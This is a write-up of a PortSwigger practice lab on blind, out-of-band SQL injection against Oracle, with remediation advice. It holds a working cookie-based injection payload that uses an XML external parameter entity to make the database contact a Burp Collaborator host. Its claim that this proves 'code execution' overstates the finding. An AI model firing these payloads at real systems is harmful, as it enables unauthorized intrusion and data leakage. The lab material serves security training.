# Lab 16 — Blind SQL injection with out-of-band interaction

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | Blind SQLi (OAST) |
| **Concept** | [12 — Out-of-band SQLi (OAST)](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band |

---

## 🎯 Objective
The `TrackingId` cookie is injectable, but it's processed **asynchronously** — no visible output, no error, no usable timing. Prove the vulnerability by triggering an **out-of-band (DNS) interaction** to Burp Collaborator. Engine: **Oracle**.

## 🧠 Background
When in-band and timing channels fail, make the **database itself** perform a DNS/HTTP lookup to a host you control. Oracle's XML/XXE primitive (`extractvalue` + a parameter entity) reliably forces a DNS resolution.

## 🪜 Methodology
1. In Burp, open **Collaborator** and click **Copy to clipboard** to get a unique `*.oastify.com` payload domain.
2. Inject an Oracle payload that resolves that domain, via the `TrackingId` cookie:
   ```sql
   TrackingId=xyz'||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://BURP-COLLAB.oastify.com/"> %25remote;]>'),'/l') FROM dual)--
   ```
   (`%25` is a URL-encoded `%`, required for the XML parameter-entity syntax.)
3. Send the request, then click **Poll now** in Collaborator — a **DNS** (and possibly HTTP) interaction from the lab confirms the vulnerability.

## 💥 Payload (readable form)
```sql
' UNION SELECT extractvalue(xmltype(
  '<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLAB.oastify.com/"> %remote;]>'
),'/l') FROM dual--
```

## ✅ Why it works
The Oracle XML parser expands the external **parameter entity**, which forces the database server to resolve/fetch `BURP-COLLAB.oastify.com`. Collaborator records that lookup — proving code execution over a channel that doesn't depend on the HTTP response at all.

## 🛡️ Remediation
Parameterize; block outbound DNS/HTTP from the DB server (egress filtering); disable unneeded XML/network packages. See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
OAST beats fully blind + async injection — the DB phones home. `#sqli` `#practitioner` `#oob` `#oast` `#oracle`
